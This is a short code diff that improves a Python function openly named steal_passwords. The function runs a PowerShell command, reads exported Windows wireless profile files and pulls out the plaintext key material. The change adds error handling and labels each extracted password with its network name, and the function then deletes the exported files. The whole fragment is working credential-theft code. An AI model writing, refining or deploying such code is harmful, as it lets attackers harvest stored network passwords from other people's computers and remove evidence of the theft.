@@ -16,12 +16,18 @@ def steal_passwords() -> str:
     os.system(f'powershell -Command "{command2}"')
     result = ""
     for filename in os.listdir(path):
-        with open(path + filename, "r") as f:
-            content = f.read()
-            start = content.find("<keyMaterial>") + len("<keyMaterial>")
-            end = content.find("</keyMaterial>")
-            if end != -1 and start != -1:
-                password = content[start:end]
-                result += password + "\n"
+        try:
+            with open(path + filename, "r") as f:
+                result += filename[8:-4] + ": "
+                content = f.read()
+                start = content.find("<keyMaterial>") + len("<keyMaterial>")
+                end = content.find("</keyMaterial>")
+                if end != -1 and start != -1:
+                    password = content[start:end]
+                    result += password
+        except Exception as e:
+            print(e)
+        finally:
+            result += "\n"
     shutil.rmtree(path)
     return result
